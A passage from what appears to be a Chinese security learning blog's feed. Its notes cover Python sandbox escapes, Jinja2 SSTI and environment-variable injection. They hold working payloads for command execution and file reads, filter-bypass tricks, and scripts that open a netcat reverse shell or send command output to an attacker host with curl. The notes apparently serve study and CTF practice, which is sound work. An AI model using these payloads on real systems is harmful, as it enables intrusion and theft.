class="subst">&#123;i[<span class="number">2</span>]==i[<span class="number">3</span>]&#125;</span>&#x27;</span>)) == ans)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="built_in">eval</span>(<span class="string">f&#x27;<span class="subst">&#123;i[<span class="number">0</span>]==i[<span class="number">1</span>]&#125;</span> + <span class="subst">&#123;i[<span class="number">2</span>]==i[<span class="number">3</span>]&#125;</span>&#x27;</span>)) == ans)</span><br></pre></td></tr></table></figure><p>上面这几个表达式都可以替换掉 or</p><ul><li>替换 and 的测试代码</li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [(<span class="number">100</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">1</span>), (<span class="number">100</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>), (<span class="number">100</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">2</span>), (<span class="number">100</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>)]:</span><br><span class="line">    ans = i[<span class="number">0</span>]==i[<span class="number">1</span>] <span class="keyword">and</span> i[<span class="number">2</span>]==i[<span class="number">3</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="built_in">eval</span>(<span class="string">f&#x27;<span class="subst">&#123;i[<span class="number">0</span>]==i[<span class="number">1</span>]&#125;</span> &amp; <span class="subst">&#123;i[<span class="number">2</span>]==i[<span class="number">3</span>]&#125;</span>&#x27;</span>)) == ans)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="built_in">eval</span>(<span class="string">f&#x27;<span class="subst">&#123;i[<span class="number">0</span>]==i[<span class="number">1</span>]&#125;</span> * <span class="subst">&#123;i[<span class="number">2</span>]==i[<span class="number">3</span>]&#125;</span>&#x27;</span>)) == ans)</span><br></pre></td></tr></table></figure><p>上面这几个表达式都可以替换掉 and</p><h3 id="限制括号"><a href="#限制括号" class="headerlink" title="限制括号()"></a>限制括号<code>()</code></h3><p>这种情况下通常需要能够支持 exec 执行代码。因为有两种姿势：</p><ul><li>利用装饰器 <code>@</code></li><li>利用魔术方法，例如 <code>enum.EnumMeta.__getitem__</code></li></ul><h3 id="利用新特性"><a href="#利用新特性" class="headerlink" title="利用新特性"></a>利用新特性</h3><p>PEP 498 引入了 <code>f-string</code>，利用方式：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;whoami&quot;</span>)&#125;</span>&#x27;</span></span><br><span class="line">yan</span><br><span class="line"><span class="string">&#x27;0&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="利用反序列化"><a href="#利用反序列化" class="headerlink" title="利用反序列化"></a>利用反序列化</h3><p>详见pickle反序列化:<a href="https://hades-blog.github.io/2024/02/13/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://hades-blog.github.io/2024/02/13/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></p>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>新周记4</title>
      <link href="/2024/02/26/%E5%91%A8%E8%AE%B0-2024-02-26-%E6%96%B0%E5%91%A8%E8%AE%B04/"/>
      <url>/2024/02/26/%E5%91%A8%E8%AE%B0-2024-02-26-%E6%96%B0%E5%91%A8%E8%AE%B04/</url>
      
        <content type="html"><![CDATA[<p>总结:<br><a href="https://hades-blog.github.io/2024/02/24/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-SSTI/">https://hades-blog.github.io/2024/02/24/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-SSTI/</a></p><p>嗯快开学了好像摆了一两天,不过过程中闲着没事看了看用go写脚本,看起来还不错</p>]]></content>
      
      
      <categories>
          
          <category> 周记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 周记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全-SSTI(服务器端模板注入)</title>
      <link href="/2024/02/24/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-SSTI/"/>
      <url>/2024/02/24/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-SSTI/</url>
      
        <content type="html"><![CDATA[<p>判断模板引擎:</p><p><img src="https://image.3001.net/images/20230825/1692946160_64e84ef0da36dc8205949.png" alt="image.png"></p><p>其中<code>绿色箭头</code>代表<strong>内容被执行</strong>,回显执行后内容,进行下一步测试</p><p>而<code>红色箭头</code>代表内容<strong>没有被执行</strong>,回显原内容,进行下一步测试</p><p><strong>注</strong>:<code>&#123;&#123;7*'7'&#125;&#125;</code>在Twig中返回<code>49</code>，在Jinja2中返回<code>77777777</code></p><p>接下来主要从Flask框架中学习SSTI</p><h2 id="1-Flask框架-Jinja2引擎-中的SSTI"><a href="#1-Flask框架-Jinja2引擎-中的SSTI" class="headerlink" title="1.Flask框架(Jinja2引擎)中的SSTI"></a>1.Flask框架(Jinja2引擎)中的SSTI</h2><p>详解:<a href="https://cloud.tencent.com/developer/article/2130787">https://cloud.tencent.com/developer/article/2130787</a></p><h3 id="1-1原理"><a href="#1-1原理" class="headerlink" title="1.1原理"></a>1.1原理</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    html = <span class="string">&#x27;&#123;&#123;12*12&#125;&#125;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(html)</span><br></pre></td></tr></table></figure><p>其中页面回显144,即大括号中的<code>12*12</code>被执行</p><p>若<code>&#123;&#123; &#125;&#125;</code>其中内容可控,就造成了SSTI漏洞</p><hr><p>但因为沙盒机制严格地限制了程序的行为,某些可以造成危害的语句虽然可以执行，却不会执行成功</p><p>对于SSTI的利用,是通过魔术方法,找到各个类之间的继承关系,调用其他类中的函数</p><h3 id="类的继承与魔术方法"><a href="#类的继承与魔术方法" class="headerlink" title="类的继承与魔术方法"></a>类的继承与魔术方法</h3><p>子类调用父类下的其他子类，所有数据类型的最终父类都是<strong>object</strong></p><p>魔术方法:</p><p><code>__class__</code>:查找当前类型所属的对象</p><p><code>__base__</code>:沿着父子类的关系往上走一个</p><p><code>__mro__</code>：查找当前类对象的所有继承类</p><p><code>__subclasses__（）</code>：查找父类下所有子类</p><p><code>__init__</code>：查看类是否重载(重载是指程序在运行时就已经加载好这个模块到内存中)，如果出现<code>no wrapper</code>字眼，说明没有重载</p><p><code>__globals__</code>:函数会以字典的形式返回当前对象的全局全局变量，寻找可用的方法</p><h3 id="1-2利用-流程"><a href="#1-2利用-流程" class="headerlink" title="1.2利用(流程)"></a>1.2利用(流程)</h3><ul><li>找到有SSTI的地方(例如利用<code>&#123;&#123;7*7&#125;&#125;</code>判断),先定位到某个类的父类object</li></ul><p><code>&#123;&#123;''.__class__.__base__&#125;&#125;</code></p><ul><li>接下来看页面加载了哪些子类</li></ul><p><code>&#123;&#123;''.__class__.__base__.subclasses()&#125;&#125;</code></p><p><img src="https://s2.loli.net/2024/02/24/2G71iOU69lhRArT.png" alt="image.png"></p><p>找到可以利用的子类及其编号</p><ul><li>例如在117位有可利用的类<code>os._wrap_close</code>,并测试其是否重载后查看这个类中有哪些可用的方法函数</li></ul><p><code>&#123;&#123;''.__class__.__base__.subclasses()[117].__init__.__globals__&#125;&#125;</code></p><ul><li>接下来假如此类中有可以RCE的函数(例如<code>popen</code>),那么可以直接利用此函数执行命令并进行读取,例如执行<code>ls /</code></li></ul><p><code>&#123;&#123;''.__class__.__base__.subclasses()[117].__init__.__globals__['popen']('ls /').read()&#125;&#125;</code></p><h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><p>查找子类<code>_frozen_importlib_external.FileLoader</code>的序号(假如是128)</p><p>FileLoader 的利用:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">128</span>][<span class="string">&#x27;get_data&#x27;</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>)&#125;&#125;<span class="comment">#</span></span><br></pre></td></tr></table></figure><h4 id="内建函数-eval-执行命令"><a href="#内建函数-eval-执行命令" class="headerlink" title="内建函数 eval 执行命令"></a>内建函数 eval 执行命令</h4><p>object 类中加载<code>_frozen_importlib_external.FileLoader</code>或者其他可行的子类（有很多可用，可以用脚本测试）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p><strong>注</strong>：</p><ol><li><code>__builtins__</code>提供对 Python 的所有”内置”标志符进行直接访问</li><li><code>__import__(&#39;os&#39;)</code>加载 os 模块</li><li><code>popen()</code>执行一个 shell 以运行命令来开启一个进程</li></ol><h4 id="os-模块执行命令"><a href="#os-模块执行命令" class="headerlink" title="os 模块执行命令"></a>os 模块执行命令</h4><p>在其他函数中直接调用 os 模块</p><ul><li>通过 config</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><ul><li>通过 url_for</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__.os.popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><ul><li>在已加载 os 模块的子类中直接调用 os 模块</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">128</span>].__init__.__globals__</span><br><span class="line">[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><ul><li>其他</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;g.pop.__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line">&#123;&#123;joiner.__init__.__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line">&#123;&#123;application.__init__.__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line">&#123;&#123;lipsum.__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="importlib-类命令执行"><a href="#importlib-类命令执行" class="headerlink" title="importlib 类命令执行"></a>importlib 类命令执行</h4><p>oject 类中的 importlib 加载第三方库<code>_frozen_importlib.BuiltinImporter</code>，使用<code>load_module</code>加载 os</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[<span class="number">107</span>][<span class="string">&#x27;load_module&#x27;</span>](<span class="string">&#x27;os&#x27;</span>)</span><br><span class="line">[<span class="string">&#x27;popen&#x27;</span>][<span class="string">&#x27;ls&#x27;</span>].read()&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="其他函数命令执行"><a href="#其他函数命令执行" class="headerlink" title="其他函数命令执行"></a>其他函数命令执行</h4><ul><li>linecache 函数命令执行</li></ul><p>linecache 函数可用于读取任何一个文件的某一行，也引入了 os 模块</p><ul><li>subprocess.Popen 类命令执行</li></ul><p>subprocess 可以替代 system，popen</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;.__class__.__base__.__subclasses__()[<span class="number">384</span>](<span class="string">&#x27;ls&#x27;</span>,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>).communicate.strip()&#125;&#125;<span class="comment">#</span></span><br></pre></td></tr></table></figure><h3 id="1-3绕过"><a href="#1-3绕过" class="headerlink" title="1.3绕过"></a>1.3绕过</h3><h4 id="绕过双大括号过滤"><a href="#绕过双大括号过滤" class="headerlink" title="绕过双大括号过滤"></a>绕过双大括号过滤</h4><p>利用<code>&#123;% %&#125;</code>写入语句,判断是否能够执行</p><p>例如:<code>&#123;% if 2>1 %&#125;Hades&#123;%endif%&#125;</code>网页会回显Hades</p><ul><li>通过脚本测试哪个子类内有可执行语句(判断是否有回显),其中自行修改url以及data部分的传参名:</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;xxx.com&#x27;</span> <span class="comment">#目标主机</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = &#123;<span class="string">&quot;code&quot;</span>: <span class="string">&#x27;&#123;% if&#x27;</span><span class="string">&#x27;.__class__.__base__.__subclasses__()[&#x27;</span> + <span class="built_in">str</span>(</span><br><span class="line">            i) + <span class="string">&#x27;].__init__.__globals__[&quot;popen&quot;](&quot;ls /&quot;).read() %&#125;Hades&#123;% endif %&#125;&#x27;</span>&#125;</span><br><span class="line">        response = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Hades&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">print</span>(i, <span class="string">&quot;--&gt;&quot;</span>, data)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>运行之后脚本回显出可执行的子类序号<code>i</code>和payload</p><ul><li>再利用<code>&#123;%print()%&#125;</code>回显执行后内容,例如i为117,回显<code>ls /</code>的内容:</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">117</span>].__init__.__globals__[<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;ls /&quot;</span>).read())%&#125;</span><br></pre></td></tr></table></figure><h4 id="绕过中括号-过滤"><a href="#绕过中括号-过滤" class="headerlink" title="绕过中括号[]过滤"></a>绕过中括号<code>[]</code>过滤</h4><p>利用:<code>__getitem__()</code>魔术方法</p><p>对字典使用时，传入字符串，返回对应字典对应键所对应的值;</p><p>对列表使用时，传入整数，返回列表所对应的值;</p><p><strong>也就是</strong>:<code>[117]</code>等价于<code>__getitem__(117)</code></p><h4 id="绕过单双引号-过滤"><a href="#绕过单双引号-过滤" class="headerlink" title="绕过单双引号&#39; &quot;过滤"></a>绕过单双引号<code>&#39; &quot;</code>过滤</h4><p>利用request模块:<code>request.args.key、request.cookies.key、request.form.key、request.values.x1、request.headers</code></p><p>配合其他点传入参数进行利用,例如(get传参给post数据中的request模块):</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/xxx.com?popen=popen&amp;cmd=ls</span> / <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="string">Content-Type:</span> multipart/form-data;</span><br><span class="line"></span><br><span class="line"><span class="language-handlebars"><span class="language-xml">code=</span><span class="template-variable">&#123;&#123;<span class="name">&#x27;&#x27;.__class__.__base__.subclasses</span>()[117].__init__.__globals__[request.args.popen](<span class="name">request.args.cmd</span>).read()&#125;&#125;</span></span></span><br></pre></td></tr></table></figure><h4 id="绕过下划线-过滤"><a href="#绕过下划线-过滤" class="headerlink" title="绕过下划线_过滤"></a>绕过下划线<code>_</code>过滤</h4><ul><li>利用:过滤器<code>attr()</code>以及request模块,例如之前的payload改为:</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET提交:</span><br><span class="line">xxx.com?cla=__class__&amp;bas=__base__&amp;sub=__subclasses__&amp;ini=__init__&amp;glo=__globals__&amp;gei=__getitem__</span><br><span class="line"></span><br><span class="line">POST提交:</span><br><span class="line">code+&#123;&#123;<span class="string">&#x27;&#x27;</span>|attr(request.args.cla)|attr(request.args.bas)|attr(request.args.sub)()|attr(request.args.gei)(<span class="number">117</span>)|attr(request.args.ini)|attr(request.args.glo)|attr(request.args.gei)(<span class="string">&#x27;popen&#x27;</span>)(<span class="string">&#x27;ls /&#x27;</span>)|attr(<span class="string">&#x27;read&#x27;</span>)()&#125;&#125;</span><br></pre></td></tr></table></figure><ul><li><p>unicode编码</p></li><li><p>16位编码</p></li><li><p>base64编码</p></li><li><p>格式化字符串:<code>%c</code>,<code>%(95)</code>为下划线</p></li></ul><h4 id="绕过点-过滤"><a href="#绕过点-过滤" class="headerlink" title="绕过点.过滤"></a>绕过点<code>.</code>过滤</h4><p>用<code>[]</code>代替或者用<code>attr()</code>(python可以使用<code>[]</code>访问对象属性)</p><p>例如<code>&#123;&#123;''['__class__']['__base__']&#125;&#125;</code></p><h4 id="绕过数字过滤"><a href="#绕过数字过滤" class="headerlink" title="绕过数字过滤"></a>绕过数字过滤</h4><p>利用:过滤器<code>length</code></p><p>例如<code>&#123;% set a='aaaaa'|length*'aa'|length-'a'|length %&#125;</code>的结果是9</p><h4 id="绕过关键字过滤"><a href="#绕过关键字过滤" class="headerlink" title="绕过关键字过滤"></a>绕过关键字过滤</h4><ul><li><p>字符编码</p></li><li><p>简单拼接:<code>&#39;&#39;[&#39;__cla&#39;+&#39;ss__&#39;]</code></p></li><li><p>利用~拼接:<code>&#123;%set a='__cla'%&#125;&#123;%set b='ss__'%&#125;&#123;&#123;a~b&#125;&#125;</code></p></li><li><p>使用过滤器(reverse反转、replace替换、join拼接等):<code>&#123;% set a="__ssalc__"|reverse%&#125;&#123;&#123;a&#125;&#125;</code></p></li><li><p>利用char()</p></li><li><p>使用dict()|join:<code>dict(cla=a,ss=a)|join</code>结果为class</p></li></ul><h3 id="1-4无回显SSTI"><a href="#1-4无回显SSTI" class="headerlink" title="1.4无回显SSTI"></a>1.4无回显SSTI</h3><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>利用SSTI执行命令,反弹shell,</p><p>提前监听端口,通过脚本多次尝试连接:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;xxx.com&#x27;</span> <span class="comment">#目标主机</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = &#123;<span class="string">&quot;code&quot;</span>: <span class="string">&#x27;&#123;&#123;&#x27;</span><span class="string">&#x27;.__class__.__base__.__subclasses__()[&#x27;</span> + <span class="built_in">str</span>(</span><br><span class="line">            i) + <span class="string">&#x27;].__init__.__globals__[&quot;popen&quot;](&quot;netcat 192.168.191.128 7777 -e /bin/bash&quot;).read()&#125;&#125;&#x27;</span>&#125;</span><br><span class="line">        response = requests.post(url, data=data)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h4 id="数据带外注入"><a href="#数据带外注入" class="headerlink" title="数据带外注入"></a>数据带外注入</h4><p>提前开启python http监听(<code>python3 -m http.sever 80</code>),通过脚本多次尝试发送数据(例如将<code>ls /</code>的内容发送到攻击机):</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;xxx.com&#x27;</span> <span class="comment">#目标主机</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = &#123;<span class="string">&quot;code&quot;</span>: <span class="string">&#x27;&#123;&#123;&#x27;</span><span class="string">&#x27;.__class__.__base__.__subclasses__()[&#x27;</span> + <span class="built_in">str</span>(</span><br><span class="line">            i) + <span class="string">&#x27;].__init__.__globals__[&quot;popen&quot;](&quot;curl http://192.168.191.128/`ls /`&quot;).read()&#125;&#125;&#x27;</span>&#125;</span><br><span class="line">        response = requests.post(url, data=data)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>也可以使用dnslog注入</p><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>和sql注入中的同理</p><p>利用Flask中的<code>&#123;% if %&#125;Hades&#123;% endif %&#125;</code>以及<code>read()[1:2],read()[2,3]...</code>判断每一位的字符是否能回显出Hades</p><p>写脚本爆破出执行命令后内容的每一位</p><h2 id="2-smarty引擎中的SSTI"><a href="#2-smarty引擎中的SSTI" class="headerlink" title="2.smarty引擎中的SSTI"></a>2.smarty引擎中的SSTI</h2>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全-Xpath注入</title>
      <link href="/2024/02/23/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-Xpath%E6%B3%A8%E5%85%A5/"/>
      <url>/2024/02/23/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-Xpath%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="1-Xpath"><a href="#1-Xpath" class="headerlink" title="1.Xpath"></a>1.Xpath</h2><p>xpath是基于xml的一种查询语言，类似于sql语句，用来查询存储在xml文档中的数据</p>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全-环境变量注入</title>
      <link href="/2024/02/22/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5/"/>
      <url>/2024/02/22/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>详解:<a href="https://cloud.tencent.com/developer/article/2354373">https://cloud.tencent.com/developer/article/2354373</a></p><h2 id="利用环境变量注入RCE"><a href="#利用环境变量注入RCE" class="headerlink" title="利用环境变量注入RCE"></a>利用环境变量注入RCE</h2><p>对于这样的代码来进行RCE</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;envs&#x27;</span>] <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;<span class="subst">&#123;$key&#125;</span>=<span class="subst">&#123;$val&#125;</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//... 一些其他代码</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;echo hello&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>环境变量利用</strong>:</p><ul><li>BASH_ENV：可以在bash -c的时候注入任意命令</li><li>ENV：可以在sh -i -c的时候注入任意命令</li><li>PS1：可以在sh或bash交互式环境下执行任意命令</li><li>PROMPT_COMMAND：可以在bash交互式环境下执行任意命令</li><li>BASH_FUNC_xxx%%：可以在bash -c或sh -c的时候执行任意命令</li></ul><p>对于刚才的代码,就可以这样来执行<code>whoami</code>命令(bash环境下):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?envs[BASH_FUNC_echo%%]=()%20&#123;%20whoami;%20&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全-目录遍历(穿越)漏洞</title>
      <link href="/2024/02/21/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86-%E7%A9%BF%E8%B6%8A/"/>
      <url>/2024/02/21/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86-%E7%A9%BF%E8%B6%8A/</url>
      
